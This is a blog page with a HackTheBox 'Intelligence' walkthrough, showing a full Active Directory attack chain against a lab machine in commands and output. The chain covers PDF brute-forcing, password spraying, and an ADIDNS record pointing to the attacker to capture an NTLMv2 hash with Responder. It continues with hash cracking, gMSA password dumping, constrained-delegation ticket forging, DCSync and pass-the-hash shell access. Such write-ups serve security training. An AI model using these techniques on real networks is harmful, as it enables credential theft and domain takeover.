<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Intelligence | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Computer Security,Cyber Security,Pentesting"><meta name=description content="Intelligence brings some cool enumeration and exploitation techniques to own Active Directory. It starts by enumerating a website and launching a brute-force attack to obtain several PDF files. One of these files contains a default password for a new account. By spraying this password across a list of usernames extracted from the PDFs’ metadata, a valid combination is discovered. In the file shares, there’s a scheduled PowerShell which sends a HTTP request to any subdomain under intelligence."><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/intelligence/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.77d944a2bbd7927ea7908a01acacabb2e3ded25853d6bebb131ca568e2090d35.css integrity="sha256-d9lEorvXkn6nkIoBrKyrsuPe0lhT1r67ExylaOIJDTU=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.2f98e6bd63d4b4790552a2fd8fdf9121b05beb3f6652b3216af158f45de23ed4.js integrity="sha256-L5jmvWPUtHkFUqL9j9+RIbBb6z9mUrMhavFY9F3iPtQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.111.2"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Intelligence"><meta property="og:description" content="Intelligence brings some cool enumeration and exploitation techniques to own Active Directory. It starts by enumerating a website and launching a brute-force attack to obtain several PDF files. One of these files contains a default password for a new account. By spraying this password across a list of usernames extracted from the PDFs&rsquo; metadata, a valid combination is discovered. In the file shares, there&rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under intelligence."><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/intelligence/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/intelligence/imgs/Intelligence.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2022-09-19T01:01:51+07:00"><meta property="article:modified_time" content="2022-09-19T01:01:51+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/intelligence/imgs/Intelligence.png"><meta name=twitter:title content="HackTheBox - Intelligence"><meta name=twitter:description content="Intelligence brings some cool enumeration and exploitation techniques to own Active Directory. It starts by enumerating a website and launching a brute-force attack to obtain several PDF files. One of these files contains a default password for a new account. By spraying this password across a list of usernames extracted from the PDFs&rsquo; metadata, a valid combination is discovered. In the file shares, there&rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under intelligence."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Intelligence","item":"https://fahmifj.github.io/hackthebox/intelligence/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Intelligence","name":"HackTheBox - Intelligence","description":"Intelligence brings some cool enumeration and exploitation techniques to own Active Directory. It starts by enumerating a website and launching a brute-force attack to obtain several PDF files. One of these files contains a default password for a new account. By spraying this password across a list of usernames extracted from the PDFs\u0026rsquo; metadata, a valid combination is discovered. In the file shares, there\u0026rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under intelligence.","keywords":["HackTheBox","CTF","Computer Security","Cyber Security","Pentesting"],"articleBody":"Intelligence brings some cool enumeration and exploitation techniques to own Active Directory. It starts by enumerating a website and launching a brute-force attack to obtain several PDF files. One of these files contains a default password for a new account. By spraying this password across a list of usernames extracted from the PDFs’ metadata, a valid combination is discovered. In the file shares, there’s a scheduled PowerShell which sends a HTTP request to any subdomain under intelligence.htb. By creating a new subdomain record, it is possible to capture the requester’s hash, which can be cracked offline. Bloodhound analysis reveals that the user has permission to read the password of a GMSA account, which has delegation rights to a service. These permissions can be exploited for privilege escalation to domain admin.\nSkills Learned User enumeration via file metadata ADI DNS attack AD Tools Nmap Impacket BloodHound dnstool.py gMSADumper.py Reconnaissance Nmap Port scanning with nmap reveals a bunch of ports open. Some interesting ports to dig into here are 445, 389, and 80.\n→ kali@kali «intelligence» «10.10.14.34» $ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49423,49667,49691,49709,49714 -sC -sV -oA nmap/10-tcp-allport-script-intelligence 10.10.10.248 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 00:22 EDT Nmap scan report for 10.10.10.248 Host is up (0.30s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Intelligence 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-14 11:22:29Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-14T11:24:04+00:00; +7h00m03s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-14T11:24:03+00:00; +7h00m02s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-14T11:24:04+00:00; +7h00m03s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-14T11:24:03+00:00; +7h00m02s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49423/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49691/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49709/tcp open msrpc Microsoft Windows RPC 49714/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-07-14T11:23:25 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 104.01 seconds Nmap results also reveal the some domain names. I’ll add these to my /etc/hosts.\n10.10.10.248 dc.intelligence.htb intelligence.htb Enumeration TCP 445 - SMB When approaching an AD box, I would definitely check for anonymous login on SMB.\nIt’s allowed but nothing to see here.\n→ kali@kali «intelligence» «10.10.14.34» $ smbclient -N -L //10.10.10.248/ Anonymous login successful Sharename Type Comment --------- ---- ------- SMB1 disabled -- no workgroup available TCP 389 - LDAP On LDAP, I can only retrieve the naming contexts.\n→ kali@kali «intelligence» «10.10.14.75» $ ldapsearch -LLL -x -h 10.10.10.248 -s base namingContexts dn: namingContexts: DC=intelligence,DC=htb namingContexts: CN=Configuration,DC=intelligence,DC=htb namingContexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb namingContexts: DC=DomainDnsZones,DC=intelligence,DC=htb namingContexts: DC=ForestDnsZones,DC=intelligence,DC=htb → kali@kali «intelligence» «10.10.14.75» $ ldapsearch -LLL -x -h 10.10.10.248 -b \"dc=intelligence,dc=htb\" Operations error (1) Additional information: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563 TCP 80 - Website The website hosted on this machine is a static site with no further information to dig in.\nIn the next section, there are two download buttons.\nThese buttons point to two PDF files. The file contents don’t seem to be important, but in each document’s properties there’s a potential username.\nPDF 1: http://intelligence.htb/documents/2020-01-01-upload.pdf\nPDF 2: http://intelligence.htb/documents/2020-01-01-upload.pdf\nFoothold Access as Tifanny.Molina Grabbing more PDFs Seeing the filename with pattern YYYY-MM-DD eventually led me to think “Will incrementing the date give me another pdf?”.\nThe answer is yes, it does!\nFrom here, I’ll write a script to brute-force the other PDFs with YYYY-MM-DD timestamp pattern.\n#!/bin/sh for month in {01..12} do for day in {01..31} do wget -q \"http://10.10.10.248/documents/2020-$month-$day-upload.pdf\" 2\u003e/dev/null done done And here’s what I got.\nAlternatively, I can use wget with brace expansion:\n$ wget -q http://10.10.10.248/documents/2020-{01..12}-{01..31}-upload.pdf Harvest Username via PDF Metadata It’s possible to harvest the creator name from the metadata to make a list of usernames.\n→ kali@kali «loot» «10.10.14.75» $ exiftool * | grep -i creator | cut -d ':' -f2 | cut -d ' ' -f2 | sort | uniq | tee ../users.list Anita.Roberts Brian.Baker Brian.Morris Daniel.Shelton Danny.Matthews Darryl.Harris ...[SNIP]... The first idea to come with the username list is to perform AS-REP Roasting attack. I’ve tried it but no luck there.\nPDF Content Examination I discovered two non-Lorem Ipsum files by manually examining the PDF contents.\nThe first one is 2020-06-04-upload.pdf, it contains the default password for new accounts in Intelligence Corp.\nThe second one is 2020-06-04-upload.pdf, it contains some internal information that will be useful later.\nPassword Spray From here, I can spray the password to the username list I have harvested earlier via rpcclient. This attack returns one valid pair Tiffany.Molina:NewIntelligenceCorpUser9876.\n→ kali@kali «intelligence» «10.10.14.97» $ rpcspray users.list password.list 10.10.10.248 | grep -v 'NT_STATUS_LOGON_FAILURE' [*] Trying: 'Anita.Roberts:NewIntelligenceCorpUser9876' [*] Trying: 'Brian.Baker:NewIntelligenceCorpUser9876' [*] Trying: 'Brian.Morris:NewIntelligenceCorpUser9876' ...[SNIP]... [*] Trying: 'Tiffany.Molina:NewIntelligenceCorpUser9876' Account Name: Tiffany.Molina, Authority Name: intelligence [*] Trying: 'Travis.Evans:NewIntelligenceCorpUser9876' [*] Trying: 'Veronica.Patel:NewIntelligenceCorpUser9876' [*] Trying: 'William.Lee:NewIntelligenceCorpUser9876' SMB Revisit Enumerating SMB with smbmap now returns a list of shares that are accessible by Tifanny.\n→ kali@kali «intelligence» «10.10.14.97» $ smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' [+] IP: 10.10.10.248:445 Name: dc.intelligence.htb Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC IT READ ONLY NETLOGON READ ONLY Logon server share SYSVOL READ ONLY Logon server share Users READ ONLY It turns out I can read the flag from the Users share.\n→ kali@kali «intelligence» «10.10.14.75» $ smbclient //intelligence.htb/Users -U 'Tiffany.Molina%NewIntelligenceCorpUser9876' ...[SNIP]... smb: \\\u003e ls Tiffany.Molina\\Desktop . DR 0 Sun Apr 18 20:51:46 2021 .. DR 0 Sun Apr 18 20:51:46 2021 user.txt AR 34 Thu Jul 15 08:17:40 2021 3770367 blocks of size 4096. 1444029 blocks available Privilege Escalation Access as Ted.Graves IT share On the IT share, there is a PowerShell script called downdetector.ps1.\n→ kali@kali «intelligence» «10.10.14.75» $ smbclient //intelligence.htb/IT -U 'Tiffany.Molina%NewIntelligenceCorpUser9876' Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Sun Apr 18 20:50:55 2021 .. D 0 Sun Apr 18 20:50:55 2021 downdetector.ps1 A 1046 Sun Apr 18 20:50:55 2021 3770367 blocks of size 4096. 1444112 blocks available smb: \\\u003e mget downdetector.ps1 Get file downdetector.ps1? y getting file \\downdetector.ps1 of size 1046 as downdetector.ps1 (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec) According to the comment it is said that this script is used to check web server status.\n# Check web server status. Scheduled to run every 5min Import-Module ActiveDirectory foreach($record in Get-ChildItem \"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb\" | Where-Object Name -like \"web*\") { try { $request = Invoke-WebRequest -Uri \"http://$($record.Name)\" -UseDefaultCredentials if(.StatusCode -ne 200) { Send-MailMessage -From 'Ted Graves ' -To 'Ted Graves ' -Subject \"Host: $($record.Name) is down\" } } catch {} } If I re-query this line DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb with a filter of name=web* using ldapsearch, it returns the following record.\n→ kali@kali «intelligence» «10.10.14.75» $ ldapsearch -LLL -D 'Tiffany.Molina@intelligence.htb' -w 'NewIntelligenceCorpUser9876' -x -h 10.10.10.248 -b \"DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb\" \"name=web*\" dn: DC=weboops,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intell igence,DC=htb objectClass: top objectClass: dnsNode distinguishedName: DC=weboops,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDns Zones,DC=intelligence,DC=htb instanceType: 4 whenCreated: 20210716071327.0Z whenChanged: 20210716071707.0Z uSNCreated: 102869 uSNChanged: 102872 showInAdvancedViewOnly: TRUE name: weboops objectGUID:: JGYq3NUoGU24w9fR4hg/6Q== dnsRecord:: CAAAAAUAAABMAAAAAAAAAAAAAAAAAAAA9mT1lRJ61wE= objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=intelligence,DC=htb dSCorePropagationData: 16010101000000.0Z dNSTombstoned: TRUE dc: weboops So the script basically looks for DNS records that begin with web*. For each discovered record, it performs an HTTP request to check if the record is active. And if the response code is not 200, the script sends an email notification to Ted Graves.\nThe key take away here is the wildcard (*).\nStealing NTLMv2 Response via ADIDNS According to this blog, in Active Directory (AD), it’s the default behavior that any authenticated user can create a new DNS record (ADIDNS). By knowing how the previous script works, it is possible to abuse this feature.\nHere’s the concept: I attempted to create a DNS record (subdomain) under the intelligence.htb that begins with ‘web*’. The purpose was to have the script encounter the record I created during its next execution. This way, it would trigger NTLM authentication as the Invoke-WebRequest command was used with the -UseDefaultCredentials flag.\nA well-known security researcher, Dirk-jan, has developed a handy tool called dnstool.py specifically designed for interacting with ADIDNS. This tool is included in the Krbrelayx repository, so I’ll simply clone the repository onto my machine.\n→ kali@kali «/opt» «10.10.14.75» $ git clone https://github.com/dirkjanm/krbrelayx.git \u0026\u0026 cd krbrelayx Cloning into 'krbrelayx'... remote: Enumerating objects: 98, done. remote: Total 98 (delta 0), reused 0 (delta 0), pack-reused 98 Receiving objects: 100% (98/98), 65.76 KiB | 426.00 KiB/s, done. Resolving deltas: 100% (48/48), done. Now I can use the tool to add a new ADIDNS record. This record points to my machine IP.\n→ kali@kali «krbrelayx» «10.10.14.75» git:(master) $ python3 dnstool.py -u intelligence.htb\\\\Tiffany.Molina -p 'NewIntelligenceCorpUser9876' -r 'web-iamf.intelligence.htb' -a add -d 10.10.14.75 10.10.10.248 [-] Connecting to host... [-] Binding to host [+] Bind OK /opt/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead res = dnsresolver.query(zone, 'SOA') [-] Adding new record [+] LDAP operation completed successfully At the same time, I’ll also start the Responder. Shortly after it runs, the Ted.Graves hash appear.\n→ kali@kali «krbrelayx» «10.10.14.75» git:(master) $ sudo responder -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026 MDNS Responder 3.0.6.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C ...[SNIP]... [+] Listening for events... [HTTP] NTLMv2 Client : 10.10.10.248 [HTTP] NTLMv2 Username : intelligence\\Ted.Graves [HTTP] NTLMv2 Hash : Ted.Graves::intelligence:4cca110e84677c33:3A689C04E699DF8F6E1B16A599576ABA:0101000000000000E700D4082B7AD7012AF2C454A91E32400000000002000800340039003100540001001E00570049004E002D00500032003300360049003800390058003100530046000400140034003900310054002E004C004F00430041004C0003003400570049004E002D00500032003300360049003800390058003100530046002E0034003900310054002E004C004F00430041004C000500140034003900310054002E004C004F00430041004C000800300030000000000000000000000000200000AF0854B4C9903CBE8251A0173036E36C4E1F4A5399C97563C3922EC707733A310A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D00690061006D0066002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 Cracking the Hash The hash can be cracked with hashcat\n$ ./hashcat.exe -m 5600 hashes/intelligence-ted.graves.hash ../../rockyou.txt -O ✘ INT ...[SNIP]... TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e699df8f6e1b16a599576aba:..[SNIP]..:Mr.Teddy Session..........: hashcat Status...........: Cracked Hash.Name........: NetNTLMv2 Hash.Target......: TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e...000000 ...[SNIP]... The credentials are valid\n→ kali@kali «intelligence» «10.10.14.75» $ crackmapexec smb 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy' SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) Shell as Administrator Enumeration with BloodHound Even with user Ted.Graves, I still have no shell access. From here, I’ll use BloodHound to explore more about the object relationships. I’ll use the Python ingestor.\n→ kali@kali «BloodHound.py» «10.10.14.75» git:(master) $ python3 bloodhound.py -c All -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248 INFO: Found AD domain: intelligence.htb INFO: Connecting to LDAP server: dc.intelligence.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 2 computers INFO: Connecting to LDAP server: dc.intelligence.htb INFO: Found 42 users INFO: Found 54 groups INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: svc_int.intelligence.htb INFO: Querying computer: dc.intelligence.htb INFO: Skipping enumeration for svc_int.intelligence.htb since it could not be resolved. INFO: Done in 00M 21S Using the pre-built analytics queries “Shortest Path from Owned Principal” reveals that user Ted.Graves has readGMSAPassword permission on a service account called SVC_INT. And the service account has AllowedToDelegate permission (constrained delegation) on the DC/Machine.\nRead SVC_INIT Password According to the help feature, readGMSAPassword allows you to retrieve GMSA (Group Managed Service Account) password. I’ll also note that the password might be changed after some periods just like computer account (default 30 days).\nThe author of this box has already created a tool for abusing this permission: gMSADumper.py. Running it retuns the password of svc_int$ in the form of NT hash.\n→ kali@kali «exploits» «10.10.14.75» $ ./gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb Users or groups who can read password for svc_int$: \u003e DC$ \u003e itsupport svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2 Since the password is managed by the DC, I don’t have to try to crack it.\nAbusing Constrained Delegation -\u003e Silver Ticket This site explains what a constrained delegation is:\nIf you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it’s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.\nIn this case, the service account svc_int can impersonate the domain admin and authenticate to WWW/DC.INTELLIGENCE.HTB.\n→ kali@kali «exploits» «10.10.14.75» $ ldapsearch -LLL -D \"Ted.Graves@intelligence.htb\" -w \"Mr.Teddy\" -x -h 10.10.10.248 -b \"CN=svc_int,CN=Managed ServiceDC=intelligence,DC=htb\" ...[SNIP]... msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb ...[SNIP]... With that, I can abuse this permission and perform Silver Ticket attack, I’ll use impacket-getST tool, but the result says clock skew too great.\n→ kali@kali «exploits» «10.10.14.75» $ impacket-getST 'intelligence.htb/svc_int$' -spn 'WWW\\dc.intelligence.htb' -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Getting TGT for user Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) To resolve that, I’ll need to synchronize my machine time with the DC. This can be done with ntpdate.\n→ kali@kali «intelligence» «10.10.14.75» $ sudo apt install ntpdate \u0026\u0026 sudo ntpdate 10.10.10.248 18 Jul 14:57:39 ntpdate[63324]: adjust time server 10.10.10.248 offset +0.001305 sec On the next attempt, I have obtained the admin ticket (TGS).\n→ kali@kali «intelligence» «10.10.14.75» $ impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -dc-ip 10.10.10.248 intelligence.htb/svc_int\\$ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Getting TGT for user [*] Impersonating administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in administrator.ccache DCSync Although the admin ticket was actually requested for WWW\\dc.intelligence.htb, it actually can be used for other service, like DRS (Directory Replication Service) for DCSync attack.\n→ kali@kali «intelligence» «10.10.14.75» $ export KRB5CCNAME=administrator.ccache \u0026\u0026 impacket-secretsdump -k -no-pass dc.intelligence.htb -just-dc-user administrator Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6 Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0 Administrator:des-cbc-md5:2362bc3191f23732 [*] Cleaning up... Shell Access With the administrator hash, I can use WinRM to get a shell access\n→ kali@kali «intelligence» «10.10.14.75» $ evil-winrm -i 10.10.10.248 -u 'administrator' -H '9075113fe16cf74f7c0f9b27e882dad3' Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e hostname dc *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e ipconfig Windows IP Configuration Ethernet adapter Ethernet0 2: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::a57a:d94f:fa40:87e6 Link-local IPv6 Address . . . . . : fe80::a57a:d94f:fa40:87e6%6 IPv4 Address. . . . . . . . . . . : 10.10.10.248 Subnet Mask . . . . . . . . . . . : 255.255.254.0 Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6 10.10.10.2 ","wordCount":"2514","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/intelligence/imgs/Intelligence.png","datePublished":"2022-09-19T01:01:51+07:00","dateModified":"2022-09-19T01:01:51+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/intelligence/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/ title=home>home</a></li><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Intelligence</h1><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>September 19, 2022</span>&nbsp;&#183;&nbsp;<span class=meta-read>12 min read</span></div><hr></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-445---smb aria-label="TCP 445 - SMB">TCP 445 - SMB</a></li><li><a href=#tcp-389---ldap aria-label="TCP 389 - LDAP">TCP 389 - LDAP</a></li><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#access-as-tifannymolina aria-label="Access as Tifanny.Molina">Access as Tifanny.Molina</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#access-as-tedgraves aria-label="Access as Ted.Graves">Access as Ted.Graves</a></li><li><a href=#shell-as-administrator aria-label="Shell as Administrator">Shell as Administrator</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/intelligence/imgs/Intelligence_hu356fd4ba72073136cf1edb9485d8c165_324135_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/intelligence/imgs/Intelligence_hu356fd4ba72073136cf1edb9485d8c165_324135_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/intelligence/imgs/Intelligence_hu356fd4ba72073136cf1edb9485d8c165_324135_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/intelligence/imgs/Intelligence_hu356fd4ba72073136cf1edb9485d8c165_324135_1080x0_resize_box_3.png 1080w ,https://fahmifj.github.io/hackthebox/intelligence/imgs/Intelligence.png 1400w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/intelligence/imgs/Intelligence.png alt width=1400 height=1060></figure><p><a href=https://app.hackthebox.eu/machines/Intelligence/>Intelligence</a> 